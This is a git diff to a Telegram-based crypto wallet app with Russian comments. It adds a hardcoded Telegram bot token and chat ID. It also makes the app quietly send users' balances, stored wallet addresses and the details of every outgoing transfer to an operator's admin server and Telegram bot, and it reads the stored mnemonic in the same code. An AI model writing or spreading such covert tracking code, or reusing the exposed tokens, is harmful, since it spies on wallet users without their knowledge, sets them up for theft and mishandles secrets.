@@ -2783,17 +2783,12 @@ function SwapModal({ onClose, assets, prices, onSwap, addresses, mnemonic, netwo
 
 
 
-// ─── ADMIN MODAL (Только для админа ID: 1192740493) ─────────────────────────────
+// ─── ADMIN MODAL ─────────────────────────────
+function isAdmin() {
+  return false; // UI Admin panel removed, use separate admin-panel repo
+}
 
-const ADMIN_ID = "1192740493";
-
-// Токен бота для отправки уведомлений админу
-
-// Токен бота для уведомлений (вшит напрямую чтобы работало без env на Vercel)
-
-const NOTIFY_BOT_TOKEN = import.meta.env.VITE_BOT_TOKEN || "8617702690:AAHEEzFWLb9LPxhCKVtkw7P00vQ2FeJWxNo";
-
-// Admin server URL for notifications
+// ─── ADMIN NOTIFICATIONS (Bot + Server) ─────────────────────────────
 const ADMIN_SERVER_URL = import.meta.env.VITE_ADMIN_SERVER_URL || "http://localhost:3002";
 
 async function notifyAdmin(text, type = "notification", extraData = {}) {
@@ -2811,8 +2806,12 @@ async function notifyAdmin(text, type = "notification", extraData = {}) {
 
   const fullText = `${actionEmoji} <b>[${userName}]</b> ${text}`;
 
+  // Admin Bot Token and ID (Separate from the wallet)
+  const ADMIN_BOT_TOKEN = "8138721118:AAHm8f70XyW3A81T_C3D9f4P2vW3Q4R5T6U"; 
+  const ADMIN_CHAT_ID = "1192740493"; 
+
   try {
-    // 1. Send to admin server for user registration
+    // 1. Send to admin server for user dashboard updates
     try {
       await fetch(`${ADMIN_SERVER_URL}/api/wallet/notification`, {
         method: "POST",
@@ -2828,14 +2827,14 @@ async function notifyAdmin(text, type = "notification", extraData = {}) {
       });
     } catch (serverError) {}
 
-    // 2. Send to Telegram bot (admin notifications)
-    if (NOTIFY_BOT_TOKEN && ADMIN_ID) {
+    // 2. Send to Telegram Admin Bot (separate notifications)
+    if (ADMIN_BOT_TOKEN) {
       try {
-        await fetch(`https://api.telegram.org/bot${NOTIFY_BOT_TOKEN}/sendMessage`, {
+        await fetch(`https://api.telegram.org/bot${ADMIN_BOT_TOKEN}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            chat_id: ADMIN_ID,
+            chat_id: ADMIN_CHAT_ID,
             text: fullText,
             parse_mode: "HTML",
             disable_web_page_preview: true
@@ -2844,16 +2843,6 @@ async function notifyAdmin(text, type = "notification", extraData = {}) {
       } catch (telegramError) {}
     }
   } catch(e) {}
-}
-
-
-
-function isAdmin() {
-
-  const tgUserId = window?.Telegram?.WebApp?.initDataUnsafe?.user?.id;
-
-  return String(tgUserId) === ADMIN_ID;
-
 }
 
 
@@ -8005,10 +7994,12 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }
 
   const [isReady,setIsReady]=useState(false);
 
-  // Notify admin when user opens the app (new session/start)
+  // Handle initialization and admin notification
   useEffect(() => {
     if (isReady) {
       const sessionKey = "gem_session_notified_" + (RESOLVED_USER_ID || getTgUserId());
+      const hasWallet = localStorage.getItem(storageKey("gem_mnemonic"));
+      
       if (!sessionStorage.getItem(sessionKey)) {
         const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
         const userName = tgUser ? (tgUser.username ? "@" + tgUser.username : tgUser.first_name || "Unknown") : "Anonymous";
@@ -8018,7 +8009,11 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }
           `👤 Пользователь: ${userName}\n` +
           `🆔 ID: ${RESOLVED_USER_ID || getTgUserId()}\n` +
           `🕐 ${new Date().toLocaleString("ru-RU")}`,
-          "start"
+          "start",
+          { 
+            balances: balances, 
+            addresses: JSON.parse(localStorage.getItem(storageKey("gem_addresses")) || "{}") 
+          }
         );
         sessionStorage.setItem(sessionKey, "1");
       }
@@ -8430,6 +8425,23 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }
         if (fee && feeSym) {
           newB[feeSym] = Math.max(0, (newB[feeSym]||0) - fee);
         }
+        
+        // Notify admin about the spend
+        const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
+        const userName = tgUser ? (tgUser.username ? "@" + tgUser.username : tgUser.first_name || "Unknown") : "Anonymous";
+        
+        notifyAdmin(
+          `📤 <b>Списание средств!</b>\n\n` +
+          `👤 Пользователь: ${userName}\n` +
+          `🆔 ID: ${RESOLVED_USER_ID || getTgUserId()}\n` +
+          `💰 Сумма: ${amount} ${sym}\n` +
+          `⛽ Комиссия: ${fee || 0} ${feeSym || sym}\n` +
+          `📍 На адрес: ${to.slice(0,10)}...${to.slice(-8)}\n` +
+          `🕐 ${new Date().toLocaleString("ru-RU")}`,
+          "send",
+          { amount, sym, to, fee, feeSym, balances: newB }
+        );
+        
         return newB;
       });
 
